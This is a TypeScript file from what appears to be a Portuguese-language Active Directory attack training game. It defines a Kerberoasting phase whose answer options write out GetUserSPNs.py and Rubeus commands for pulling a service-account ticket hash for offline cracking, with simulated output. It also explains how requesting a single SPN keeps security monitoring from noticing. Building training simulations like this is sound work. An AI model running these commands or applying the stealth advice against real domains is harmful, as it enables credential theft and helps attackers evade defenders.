import type { PhaseDefinition } from "./types";

export const phase06: PhaseDefinition = {
  number: 6,
  technicalName: "Kerberoasting",
  thematicName: "Captura de TGS de conta de serviço de telemetria",
  objective:
    "Solicitar TGS para um SPN suspeito (sem usar -request indiscriminado) e exportar o hash em formato crackable.",
  context: ds =>
    [
      `🎫 Foco: ${ds.kerberoastTarget.username} (SPN ${ds.kerberoastTarget.spn}).`,
      `   A descrição do objeto entrega o ouro: senha fraca herdada de migração. Esse é o tipo de`,
      `   conta de serviço que ninguém ousa tocar por medo de derrubar um pipeline de produção.`,
      ``,
      `🎯 Você vai pedir um TGS especificamente para esse SPN. O DC vai entregar — porque é o trabalho dele —`,
      `   um ticket cifrado com a chave da conta. Esse cifrado vira hash; o hash vira senha; a senha vira pivot.`,
      ``,
      `🔇 Direcionar o pedido a UM SPN gera UM evento 4769. Pedir "tudo" gera uma chuva — e o SOC enxerga.`,
      `   Antes de fechar a fase, responda à pergunta de interpretação sobre por que pedir 1×1 é melhor que pedir tudo.`,
      ``,
      `💡 Existe a ferramenta clássica da impacket e uma alternativa em C# para host ingressado.`,
      `   O importante é direcionar a um único SPN.`
    ].join("\n"),
  expectedCommand: "GetUserSPNs.py",
  acceptedCommands: ["Rubeus"],
  interpretationQuestion:
    "Por que solicitar o TGS direcionado a um único SPN é preferível, em termos operacionais, a -request all? Justifique citando o tipo de evento gerado.",
  options: [
    {
      id: "a",
      text: "GetUserSPNs.py {dom}/{user}:{pwd} -dc-ip <DC-IP> -request-user {svc} -outputfile tgs.txt",
      correct: true,
      response: ds =>
        [
          `[*] Getting TGS for ${ds.kerberoastTarget.username}`,
          `$krb5tgs$23$*${ds.kerberoastTarget.username}$${ds.domain.toUpperCase()}$${ds.kerberoastTarget.spn}*$` +
            ds.kerberoastTarget.ntlmHash +
            "..." +
            ds.kerberoastTarget.ntlmHash,
          ``,
          `[+] Hash TGS-REP exportado em formato hashcat (modo 13100).`
        ].join("\n"),
      scoreDelta: 1.5,
      detectionDelta: 5,
      budgetDelta: -6,
      unlockEvidences: ds => [
        {
          label: "Hash TGS-REP capturado",
          payload: {
            user: ds.kerberoastTarget.username,
            spn: ds.kerberoastTarget.spn,
            mode: "hashcat -m 13100"
          }
        }
      ],
      flag: ds => ds.flags.p6
    },
    {
      id: "b",
      text: "Rubeus.exe kerberoast /user:{svc} /outfile:tgs.txt /nowrap",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `[*] Action: Kerberoasting`,
          `[*] Target User                : ${ds.kerberoastTarget.username}`,
          `[*] SPN                        : ${ds.kerberoastTarget.spn}`,
          `[*] Hash written to tgs.txt`,
          ``,
          `[+] Caminho alternativo válido (Rubeus em host ingressado).`
        ].join("\n"),
      scoreDelta: 1.2,
      detectionDelta: 7,
      budgetDelta: -5,
      unlockEvidences: ds => [
        { label: "TGS via Rubeus", payload: { tool: "Rubeus", user: ds.kerberoastTarget.username } }
      ],
      flag: ds => ds.flags.p6
    },
    {
      id: "c",
      text: "GetUserSPNs.py {dom}/{user}:{pwd} -request -dc-ip <DC-IP>",
      correct: false,
      response: () =>
        "Requisita TGS para TODOS os SPNs — pico de eventos 4769 e detecção alta.",
      scoreDelta: -0.4,
      detectionDelta: 18,
      budgetDelta: -6
    },
    {
      id: "d",
      text: "setspn -Q */* ",
      correct: false,
      response: () => "Apenas lista SPNs já visíveis na fase anterior; não obtém TGS.",
      scoreDelta: -0.2,
      detectionDelta: 2,
      budgetDelta: -3
    },
    {
      id: "e",
      text: "klist purge && klist",
      correct: false,
      response: () => "Limpar cache de tickets atrapalha a sessão sem produzir Kerberoast.",
      scoreDelta: -0.3,
      detectionDelta: 3,
      budgetDelta: -2
    }
  ],
  techExplanation:
    "Kerberoasting direcionado pede TGS apenas para o SPN suspeito, gerando um único evento 4769 por alvo, em vez de uma rajada. Hash sai em formato $krb5tgs$23$ e é cracked offline."
};
